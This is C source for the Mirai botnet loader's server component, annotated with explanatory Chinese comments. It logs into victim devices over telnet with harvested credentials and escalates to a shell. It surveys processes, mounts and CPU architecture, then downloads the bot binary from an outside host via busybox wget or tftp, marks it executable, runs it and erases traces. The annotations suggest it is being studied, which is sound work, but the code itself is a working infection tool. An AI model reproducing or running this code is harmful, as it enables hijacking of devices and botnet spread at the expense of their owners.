#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <sched.h>
#include <errno.h>
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/connection.h"
#include "headers/binary.h"
#include "headers/util.h"
//server.c       向感染设备发起telnet交互，上传payload文件
//loader的主要功能在server.c

//创建srv结构体【维护mirai端的信息，server端的信息。victim是client端，这个server要接收client端的连接】
struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
{
    struct server *srv = calloc(1, sizeof (struct server)); 
    struct server_worker *workers = calloc(threads, sizeof (struct server_worker));     //貌似没有用到【而且没有释放，内存泄露】
    int i;

    // Fill out the structure
    srv->bind_addrs_len = addr_len; //server监听和绑定的地址，以及允许连接入的数量
    srv->bind_addrs = addrs;
    srv->max_open = max_open;
    srv->wget_host_ip = wghip;
    srv->wget_host_port = wghp;
    srv->tftp_host_ip = thip;
    //一个server最多只能有max_open个connection，但是这里分配了max_open*2的空间，目的是要以本地创建的socket fd为index来索引得到connection
    //为了fd能大一点，则多分配一些空间
    srv->estab_conns = calloc(max_open * 2, sizeof (struct connection *));  //也就是说estab_conns维护连接到这个server的连接信息【运行并行连接的数量由max_open决定】
    srv->workers = calloc(threads, sizeof (struct server_worker));  //根据参数threads决定这个server的server_worker的数量
    srv->workers_len = threads;     //server_worker的数量【每一个worker对应一个线程】，因此server_worker的数量就是线程的数量

    if (srv->estab_conns == NULL)   //不能成功分配存储的连接空间
    {
        printf("Failed to allocate establisted_connections array\n");
        exit(0);
    }

    // Allocate locks internally
    for (i = 0; i < max_open * 2; i++)  //connection的数量为 max_open * 2
    {
        srv->estab_conns[i] = calloc(1, sizeof (struct connection));    //为每个连接结构体分配空间
        if (srv->estab_conns[i] == NULL)
        {
            printf("Failed to allocate connection %d\n", i);
            exit(-1);
        }
        pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL); //为每个连接初始化对应的lock
    }

    // Create worker threads【threads的大小应该是当前server所在cpu的核数=>  int num = sysconf(_SC_NPROCESSORS_CONF);】
    for (i = 0; i < threads; i++)   //初始化这个server的所有server_worker
    {
        struct server_worker *wrker = &srv->workers[i];

        wrker->srv = srv;
        wrker->thread_id = i;   //并不是真实的thread_id，只是mirai为了管理worker thread设置的id【实际是这个worker绑定的cpu核的id，从0开始标号】

        if ((wrker->efd = epoll_create1(0)) == -1)  //为每个worker建立一个epoll，看来每个worker会处理多个input/output
        {
            printf("Failed to initialize epoll context. Error code %d\n", errno);
            free(srv->workers);
            free(srv);
            return NULL;
        }
        //&wrker->thread存储了这个server_worker的线程描述符
        //pthread_create在线程创建以后，就开始运行相关的线程函数
        pthread_create(&wrker->thread, NULL, worker, wrker);       //为每个server_worker创建一个对应的线程，每个线程都运行事件处理函数worker函数，以对应的server_worker为参数
    }

    pthread_create(&srv->to_thrd, NULL, timeout_thread, srv);   //每个server有一个对应的线程，运行timeout_thread函数，估计是判断是否超时。

    return srv; //返回初始化和启动线程后的server结构体
}

//释放资源
void server_destroy(struct server *srv)
{
    if (srv == NULL)
        return;
    if (srv->bind_addrs != NULL)
        free(srv->bind_addrs);
    if (srv->workers != NULL)
        free(srv->workers);
    free(srv);
}


//判断能否处理新的感染节点
void server_queue_telnet(struct server *srv, struct telnet_info *info)
{
    while (ATOMIC_GET(&srv->curr_open) >= srv->max_open)    //原子的访问srv->curr_open，判断当前的conn数是否达到上限，达到则等待
    {
        sleep(1);
    }
    ATOMIC_INC(&srv->curr_open);    //conn++

    if (srv == NULL)
        printf("srv == NULL 3\n");

    server_telnet_probe(srv, info); //如果还有能存储connection的位置，就连接这个info。把连接信息更新到srv中
}

//处理新的感染节点【新建本地fd，连接victim，把相关信息加入srv的connection数组，设置worker中的epoll处理本地fd的从victim中收到交互信息】
void server_telnet_probe(struct server *srv, struct telnet_info *info)
{
    int fd = util_socket_and_bind(srv);     //bind本地地址，并且返回本地的socket fd。通过这个socket和victim交互
    struct sockaddr_in addr;
    struct connection *conn;
    struct epoll_event event;
    int ret;
    //选择一个worker，用于处理新感染节点的事件。【curr_worker_child初始应该为0，然后遍历worker，每次顺序选一个worker处理新的感染节点】
    struct server_worker *wrker = &srv->workers[ATOMIC_INC(&srv->curr_worker_child) % srv->workers_len];

    if (fd == -1)
    {
        if (time(NULL) % 10 == 0)
        {
            printf("Failed to open and bind socket\n");
        }
        ATOMIC_DEC(&srv->curr_open);    //conn--【本地无法新建socket处理新的感染节点，因此server_queue_telnet中的conn++要消除】
        return;
    }
    while (fd >= (srv->max_open * 2))   //fd超过srv->max_open * 2，那么之后srv->estab_conns[fd]查找connection的时候就会越界。
    {
        printf("fd too big\n"); //本地socket太大，close
        conn->fd = fd;
#ifdef DEBUG
        printf("Can't utilize socket because client buf is not large enough\n");
#endif
        connection_close(conn); //关闭连接，修改srv->curr_open--等参数，fd被置为-1
        return;
    }

    if (srv == NULL)
        printf("srv == NULL 4\n");

    conn = srv->estab_conns[fd];    //也就是本地的socket标识符是srv的connection数组的下标
    memcpy(&conn->info, info, sizeof (struct telnet_info)); //把新的感染节点的info复制到&conn->info中【存储了user，pw】
    conn->srv = srv;
    conn->fd = fd;      //和victim连接的本地socket fd
    connection_open(conn);  //初始化conn的其他参数【状态改为TELNET_CONNECTING】

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = info->addr;  //server对victim主动发起连接
    addr.sin_port = info->port;
    ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));   //尝试连接
    if (ret == -1 && errno != EINPROGRESS)
    {
        printf("got connect error\n");
    }
    //成功连接，将server的socket fd加入epoll。用于处理server向victim的读写
    event.data.fd = fd;
    event.events = EPOLLOUT;    //告诉内核需要监听这个fd的什么事件：允许对这个fd写【server可以对这个fd写命令给victim执行】
    //相反，如果victim对这个fd写了【也就是server传输命令，victim回显结果的时候】，就会触发这个event EPOLLIN【允许对这个fd读】
    
    //从之前选中的处理当前新增感染节点的worker的epoll【wrker->efd】中加入【EPOLL_CTL_ADD】当前需要处理的用于通信的fd【这个fd用于反馈victim的交互情况】
    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);   //增删改epoll中的fd：https://man7.org/linux/man-pages/man2/epoll_ctl.2.html
}


static void bind_core(int core) //设置某个线程只能在某个core上运行。和这个core绑定。
{
    pthread_t tid = pthread_self();
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset); //当前线程只能在cpu_set集合中被设置的cpu核上调度，如果只设置了一个，就这个线程只绑定了一个核。
    if (pthread_setaffinity_np(tid, sizeof (cpu_set_t), &cpuset) != 0) //https://www.cnblogs.com/vanishfan/archive/2012/11/16/2773325.html
        printf("Failed to bind to core %d\n", core);
}

//事件处理线程
//server中有多个并行执行worker函数的线程。
//arg表示srv中worker结构体信息。
//https://www.jianshu.com/p/ee381d365a29
static void *worker(void *arg)
{
    struct server_worker *wrker = (struct server_worker *)arg;
    struct epoll_event events[128];

    bind_core(wrker->thread_id);    //为这个worker线程绑定id为wrker->thread_id的cpu核

    while (TRUE)    //循环等待victim的交互信息。
    {
        int i, n = epoll_wait(wrker->efd, events, 127, -1); //等待IO事件，如果没有可用事件，则会阻塞当前线程。
        //返回值表示有多少个待处理事件。
        if (n == -1)
            perror("epoll_wait");

        for (i = 0; i < n; i++)     //调用handle_event函数处理每个event事件。
            handle_event(wrker, &events[i]);
    }
}

//事件处理
/*
The struct epoll_event is defined as:
           typedef union epoll_data {
               void    *ptr;
               int      fd;
               uint32_t u32;
               uint64_t u64;
           } epoll_data_t;

           struct epoll_event {
               uint32_t     events;    // Epoll events
               epoll_data_t data;      // User data variable 
           };
*/         
static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
{
    //ev->data.fd为触发这个事件的本地socket fd
    struct connection *conn = wrker->srv->estab_conns[ev->data.fd]; //找到对应的conn结构体

    if (conn->fd == -1)
    {
        conn->fd = ev->data.fd;
        connection_close(conn);
        return;
    }

    if (conn->fd != ev->data.fd)
    {
        printf("yo socket mismatch\n");
    }
    //查看是否是本地的处理victim的fd有错误
    // Check if there was an error
    if (ev->events & EPOLLERR || ev->events & EPOLLHUP || ev->events & EPOLLRDHUP)
    {
#ifdef DEBUG
        if (conn->open)
            printf("[FD%d] Encountered an error and must shut down\n", ev->data.fd);
#endif
        connection_close(conn);
        return;
    }

    // Are we ready to write?
    if (conn->state_telnet == TELNET_CONNECTING && ev->events & EPOLLOUT)   //是和victim连接的初始状态。然后当前的事件允许对这个本地fd写
    {
        struct epoll_event event;

        int so_error = 0;
        socklen_t len = sizeof(so_error);
        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &so_error, &len);    //判断这个socket上是否有错误
        if (so_error)
        {
#ifdef DEBUG
            printf("[FD%d] Connection refused\n", ev->data.fd);
#endif
            connection_close(conn);
            return;
        }

#ifdef DEBUG
        printf("[FD%d] Established connection\n", ev->data.fd);
#endif
        event.data.fd = conn->fd;
        //EPOLLIN:The associated file is available for read(2) operations.
        //EPOLLET：Requests edge-triggered notification for the associated file descriptor.
        //EPOLLET模式通常来说是用于非阻塞模式，避免读或写被阻塞导致的饿死的。【边缘触发，只在状态发生转移的时候，通知一次】
        //如果写了pipe的一端，另外一端使用了EPOLLET，那么只通过event读取一次，即使没有读完，也不会产生新的event了。【edge-triggered】
        //如果是状态触发，如果没有读完，还会继续产生event通知。
        //https://www.cnblogs.com/liloke/archive/2011/04/12/2014205.html
        //与其相反的是Level-triggered【差异在于：https://man7.org/linux/man-pages/man7/epoll.7.html】
        event.events = EPOLLIN | EPOLLET;   
        epoll_ctl(wrker->efd, EPOLL_CTL_MOD, conn->fd, &event);     //重新放入epoll，等待需要读取的事件【即victim回显】
        conn->state_telnet = TELNET_READ_IACS;  //进入读取IACS状态。
        conn->timeout = 30;
    }

    if (!conn->open)
    {
        printf("socket not open! conn->fd: %d, fd: %d, events: %08x, state: %08x\n", conn->fd, ev->data.fd, ev->events, conn->state_telnet);
    }

    // Is there data to read?
    if (ev->events & EPOLLIN && conn->open) //如果当前事件是读取本地fd的事件。
    {
        int ret;

        conn->last_recv = time(NULL);   //记录上次读取时间
        while (TRUE)
        {   //读取缓冲区还可以接收的长度。
            ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, sizeof (conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
            if (ret <= 0)
            {
                if (errno != EAGAIN && errno != EWOULDBLOCK)
                {
#ifdef DEBUG
                    if (conn->open)
                        printf("[FD%d] Encountered error %d. Closing\n", ev->data.fd, errno);
#endif
                    connection_close(conn);
                }
                break;
            }
#ifdef DEBUG
            printf("TELIN: %.*s\n", ret, conn->rdbuf + conn->rdbuf_pos);
#endif
            conn->rdbuf_pos += ret;     
            conn->last_recv = time(NULL);

            if (conn->rdbuf_pos > 8196)     
			{
                printf("oversized buffer pointer!\n");
				abort();
			}

            while (TRUE)        //根据当前状态，决定如何解析/处理读取的结果
            {
                int consumed;

                switch (conn->state_telnet) //注意这个state表示下一个应该达到的状态。
                {
                    case TELNET_READ_IACS:  //TELNET_CONNECTING状态之后是TELNET_READ_IACS状态。故此时是第一次受到victim的回复。先进行IACS配置商议。
                        consumed = connection_consume_iacs(conn);
                        if (consumed)
                            conn->state_telnet = TELNET_USER_PROMPT;    //进入TELNET_USER_PROMPT状态
                        break;
                    case TELNET_USER_PROMPT:
                        consumed = connection_consume_login_prompt(conn);   
                        if (consumed)
                        {
                            util_sockprintf(conn->fd, "%s", conn->info.user);   //如果是收到login的提示，先把之前存储好的conn信息中的username发送给victim
                            strcpy(conn->output_buffer.data, "\r\n");
                            conn->output_buffer.deadline = time(NULL) + 1;  //更新out_buffer的时间【表示了上一次输出的时间】，而conn->last_recv表示上一次收到的时间。
                            conn->state_telnet = TELNET_PASS_PROMPT;    //进入输入密码的阶段
                        }
                        break;
                    case TELNET_PASS_PROMPT:
                        consumed = connection_consume_password_prompt(conn);
                        if (consumed)
                        {
                            util_sockprintf(conn->fd, "%s", conn->info.pass);   //输入密码
                            strcpy(conn->output_buffer.data, "\r\n");
                            conn->output_buffer.deadline = time(NULL) + 1;
                            conn->state_telnet = TELNET_WAITPASS_PROMPT; // At the very least it will print SOMETHING
                        }
                        break;
                    case TELNET_WAITPASS_PROMPT:        //等待登录成功，激活shell提示符
                        if ((consumed = connection_consume_prompt(conn)) > 0)
                        {
                            util_sockprintf(conn->fd, "enable\r\n");    
                            util_sockprintf(conn->fd, "shell\r\n");
                            util_sockprintf(conn->fd, "sh\r\n");
                            conn->state_telnet = TELNET_CHECK_LOGIN;
                        }
                        break;
                    case TELNET_CHECK_LOGIN:
                        if ((consumed = connection_consume_prompt(conn)) > 0)   //检测登录成功，收到shell提示符
                        {
                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");  //发送/bin/busybox ECCHI
                            conn->state_telnet = TELNET_VERIFY_LOGIN;
                        }
                        break;
                    case TELNET_VERIFY_LOGIN:
                        consumed = connection_consume_verify_login(conn);   //判断有没有回复ECCHI: applet not found
                        if (consumed)
                        {
                            ATOMIC_INC(&wrker->srv->total_logins);  //增加server总的成功登录次数
#ifdef DEBUG
                            printf("[FD%d] Succesfully logged in\n", ev->data.fd);
#endif
                            util_sockprintf(conn->fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");  //执行ps命令
                            conn->state_telnet = TELNET_PARSE_PS;
                        }
                        break;
                    case TELNET_PARSE_PS:
                        if ((consumed = connection_consume_psoutput(conn)) > 0)  //解析ps命令的输出，kill带有init字符的进程【除了init进程本身】，以及以数字命名的进程
                        {   //这里才会有memmove覆盖rdbuf
                            util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");    //执行mounts命令，查看挂载的文件系统
                            conn->state_telnet = TELNET_PARSE_MOUNTS;
                        }
                        break;
                    case TELNET_PARSE_MOUNTS:
                        consumed = connection_consume_mounts(conn); //解析cat /proc/mounts的结果，将[“kami”+rw的文件系统路径]写到./文件系统根目录/nippon文件中，并且cat这个文件【回显会被传回到mirai】
                        if (consumed)
                            conn->state_telnet = TELNET_READ_WRITEABLE;
                        break;
                    case TELNET_READ_WRITEABLE:
                        consumed = connection_consume_written_dirs(conn);   //记录了当前登录用户允许读写的目录到conn->info.writedir中
                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Found writeable directory: %s/\n", ev->data.fd, conn->info.writedir);
#endif
                            util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);  //切换到可读写的目录中，准备传输payload
                            //> file :创建文件名为file的文件【空文件】
                            //创建dvrHelper文件，将该文件的权限修改为777【rwx】
                            util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_COPY_ECHO;
                            conn->timeout = 120;
                        }
                        break;
                    case TELNET_COPY_ECHO:                              
                        consumed = connection_consume_copy_op(conn);    //判断上述命令成功执行了。
                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Finished copying /bin/echo to cwd\n", conn->fd);
#endif
                            if (!conn->info.has_arch)
                            {
                                conn->state_telnet = TELNET_DETECT_ARCH;
                                conn->timeout = 120;
                                // DO NOT COMBINE THESE【通过cat echo的方式查看target的架构】
                                util_sockprintf(conn->fd, "/bin/busybox cat /bin/echo\r\n");
                                util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
                            }
                            else
                            {
                                conn->state_telnet = TELNET_UPLOAD_METHODS;
                                conn->timeout = 15;
                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                            }
                        }
                        break;
                    case TELNET_DETECT_ARCH:
                        consumed = connection_consume_arch(conn);
                        if (consumed)
                        {
                            conn->timeout = 15;
                            //conn->bin是现在真的取出来的二进制文件
                            if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)
                            {
#ifdef DEBUG
                                printf("[FD%d] Cannot determine architecture\n", conn->fd);
#endif
                                connection_close(conn);
                            }
                            else if (strcmp(conn->info.arch, "arm") == 0)
                            {
#ifdef DEBUG
                                printf("[FD%d] Determining ARM sub-type\n", conn->fd);
#endif
                                util_sockprintf(conn->fd, "cat /proc/cpuinfo; " TOKEN_QUERY "\r\n");
                                conn->state_telnet = TELNET_ARM_SUBTYPE;
                            }
                            else
                            {
#ifdef DEBUG
                                printf("[FD%d] Detected architecture: '%s'\n", ev->data.fd, conn->info.arch);
#endif
                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                conn->state_telnet = TELNET_UPLOAD_METHODS;
                            }
                        }
                        break;
                    case TELNET_ARM_SUBTYPE:
                        if ((consumed = connection_consume_arm_subtype(conn)) > 0)
                        {
                            struct binary *bin = binary_get_by_arch(conn->info.arch);

                            if (bin == NULL)
                            {
#ifdef DEBUG
                                printf("[FD%d] We do not have an ARMv7 binary, so we will try using default ARM\n", conn->fd);
#endif
                            }
                            else
                                conn->bin = bin;

                            util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_UPLOAD_METHODS;
                        }
                        break;
                    case TELNET_UPLOAD_METHODS:
                        //决定用什么方式来上传，得到上传bot binary【mirai.arch，即mirai目录下编译出来的可执行文件,./mirai/build.sh debug/release telnet】
                        //但是被重命名为dvrHelper
                        consumed = connection_consume_upload_methods(conn);

                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Upload method is ", conn->fd);
#endif
                            switch (conn->info.upload_method)
                            {
                                case UPLOAD_ECHO:
                                    conn->state_telnet = TELNET_UPLOAD_ECHO;
                                    conn->timeout = 30;
                                    util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
#ifdef DEBUG
                                    printf("echo\n");
#endif
                                    break;
                                case UPLOAD_WGET:
                                    conn->state_telnet = TELNET_UPLOAD_WGET;
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", conn->info.arch);
#ifdef DEBUG
                                    printf("wget\n");
#endif
                                    break;
                                case UPLOAD_TFTP:
                                    conn->state_telnet = TELNET_UPLOAD_TFTP;
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    FN_BINARY, "mirai", conn->info.arch, wrker->srv->tftp_host_ip);
#ifdef DEBUG
                                    printf("tftp\n");
#endif
                                    break;
                            }
                        }
                        break;
                    case TELNET_UPLOAD_ECHO:   
                        consumed = connection_upload_echo(conn);
                        if (consumed)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished echo loading!\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./%s; ./%s %s.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_echoes);
                        }
                        break;
                    case TELNET_UPLOAD_WGET:
                        consumed = connection_upload_wget(conn);
                        if (consumed)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished wget loading\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_wgets);
                        }
                        break;
                    case TELNET_UPLOAD_TFTP:
                        consumed = connection_upload_tftp(conn);
                        if (consumed > 0)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished tftp loading\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_tftps);
                        }
                        else if (consumed < -1) // Did not have permission to TFTP
                        {
#ifdef DEBUG
                            printf("[FD%d] No permission to TFTP load, falling back to echo!\n", conn->fd);
#endif
                            consumed *= -1;
                            conn->state_telnet = TELNET_UPLOAD_ECHO;
                            conn->info.upload_method = UPLOAD_ECHO;

                            conn->timeout = 30;
                            util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                        }
                        break;
                    case TELNET_RUN_BINARY:
                        if ((consumed = connection_verify_payload(conn)) > 0)
                        {
                            if (consumed >= 255)
                            {
                                conn->success = TRUE;
#ifdef DEBUG
                                printf("[FD%d] Succesfully ran payload\n", conn->fd);
#endif
                                consumed -= 255;
                            }
                            else
                            {
#ifdef DEBUG
                                printf("[FD%d] Failed to execute payload\n", conn->fd);
#endif
                                if (!conn->retry_bin && strncmp(conn->info.arch, "arm", 3) == 0)
                                {
                                    conn->echo_load_pos = 0;
                                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                                    conn->bin = binary_get_by_arch(conn->info.arch);
                                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                    conn->state_telnet = TELNET_UPLOAD_METHODS;
                                    conn->retry_bin = TRUE;
                                    break;
                                }
                            }
#ifndef DEBUG
                            util_sockprintf(conn->fd, "rm -rf " FN_DROPPER "; > " FN_BINARY "; " TOKEN_QUERY "\r\n");
#else
                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
#endif
                            conn->state_telnet = TELNET_CLEANUP;
                            conn->timeout = 10;
                        }
                        break;
                    case TELNET_CLEANUP:
                        if ((consumed = connection_consume_cleanup(conn)) > 0)
                        {
                            int tfd = conn->fd;

                            connection_close(conn);
#ifdef DEBUG
                            printf("[FD%d] Cleaned up files\n", tfd);
#endif
                        }
                    default:
                        consumed = 0;
                        break;
                }

                if (consumed == 0) // We didn't consume any data
                    break;
                else
                {
                    if (consumed > conn->rdbuf_pos)
                    {
                        consumed = conn->rdbuf_pos;
                        //printf("consuming more then our position!\n");
                        //abort();
                    }
                    conn->rdbuf_pos -= consumed;
                    memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                    conn->rdbuf[conn->rdbuf_pos] = 0;
                }

                if (conn->rdbuf_pos > 8196)
                {
                    printf("oversized buffer! 2\n");
                    abort();
                }
            }
        }
    }
}

static void *timeout_thread(void *arg)
{
    struct server *srv = (struct server *)arg;
    int i, ct;

    while (TRUE)
    {
        ct = time(NULL);

        for (i = 0; i < (srv->max_open * 2); i++)
        {
            struct connection *conn = srv->estab_conns[i];

            if (conn->open && conn->last_recv > 0 && ct - conn->last_recv > conn->timeout)
            {
#ifdef DEBUG
                printf("[FD%d] Timed out\n", conn->fd);
#endif
                if (conn->state_telnet == TELNET_RUN_BINARY && !conn->ctrlc_retry && strncmp(conn->info.arch, "arm", 3) == 0)
                {
                    conn->last_recv = time(NULL);
                    util_sockprintf(conn->fd, "\x03\x1Akill %%1\r\nrm -rf " FN_BINARY " " FN_DROPPER "\r\n");
                    conn->ctrlc_retry = TRUE;

                    conn->echo_load_pos = 0;
                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                    conn->bin = binary_get_by_arch(conn->info.arch);
                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                    conn->state_telnet = TELNET_UPLOAD_METHODS;
                    conn->retry_bin = TRUE;
                } else {
                    connection_close(conn);
                }
            } else if (conn->open && conn->output_buffer.deadline != 0 && time(NULL) > conn->output_buffer.deadline)
            {
                conn->output_buffer.deadline = 0;
                util_sockprintf(conn->fd, conn->output_buffer.data);
            }
        }

        sleep(1);
    }
}

